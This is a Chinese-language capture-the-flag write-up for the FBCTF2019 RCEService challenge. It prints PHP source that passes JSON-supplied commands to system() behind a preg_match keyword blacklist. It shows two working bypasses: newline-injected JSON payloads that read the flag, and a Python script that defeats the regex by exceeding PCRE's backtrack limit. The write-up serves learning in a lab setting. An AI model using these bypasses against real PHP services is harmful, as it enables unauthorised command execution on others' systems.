# [FBCTF2019]RCEService 绕过preg_match

确实第一次做想不到

dir啥的都扫不出来

因为 buu没有给源代码

所以完全搞不出来

只能去看看wp偷一个

```php
<?php
 
putenv('PATH=/home/rceservice/jail');
设置环境变量为 该目录
 
 
if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];
 
  if (!is_string($json)) {
判断是不是字符串
 
 
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } 
 
过滤
 
else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}
 
?>
```

代码还是很简单的

主要是怎么做

## 思路

## 第一种解法

首先我们使用ls 看看 通过json格式

```csharp
{"cmd":"ls"}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e7b48a9ff1a9452236c09124df07c570.png" alt="" style="max-height:221px; box-sizing:content-box;" />


发现是ok的

那我们根据源代码 发现 该代码通过preg_match过滤了很多

 [https://www.cnblogs.com/20175211lyz/p/12198258.html](https://www.cnblogs.com/20175211lyz/p/12198258.html) 

但是是通过

```cobol
/^.*(flag).*$/
```

这种方式 我们直接通过换行绕过 %OA

```perl
{%0A"cmd":"ls /"%0A}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7a23b9ea9bced4cc1dd020fae5ec926d.png" alt="" style="max-height:167px; box-sizing:content-box;" />


成功执行 我们现在看看 环境变量的目录下有什么

```perl
{%0A"cmd":"ls /home/rceservice"%0A}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0103b2098e2c18a486fdb99920960255.png" alt="" style="max-height:199px; box-sizing:content-box;" />


发现存在了flag

我们怎么读取呢

我们首先去找到cat命令的绝对路径

```cobol
/bin/cat
```

然后就可以读取了 因为开始设置了环境变量 所以不能直接使用cat

```cobol
?cmd={%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}
```

## 第二种解法

这道题都是围绕着我们如何绕过 preg_match过滤来进行的

我们可以通过 P神的 PRCE 来进行

因为preg_match 会进行回溯操作

 [PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html) 

意思就是

```cobol
preg_match 是按照顺序匹配的 .* 匹配所有 然后再 匹配下一个正则
 
.* 匹配完 就会发现是错误的 然后就开始回溯到正确的地方
 
但是回溯的次数是100万次
 
所以我们让他超过100万次
 
就可以造成无法回溯 绕过 preg_match
```

```cobol
import requests
 
payload = '{"cmd":"/bin/cat /home/rceservice/flag","zz":"' + "a"*(1000000) + '"}'
 
res = requests.post("http://8f81c713-85f8-45df-917f-0c923e3fea26.node4.buuoj.cn:81/", data={"cmd":payload})
print(res.text)
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/714dd92d35b71a0607e04479953b9575.png" alt="" style="max-height:280px; box-sizing:content-box;" />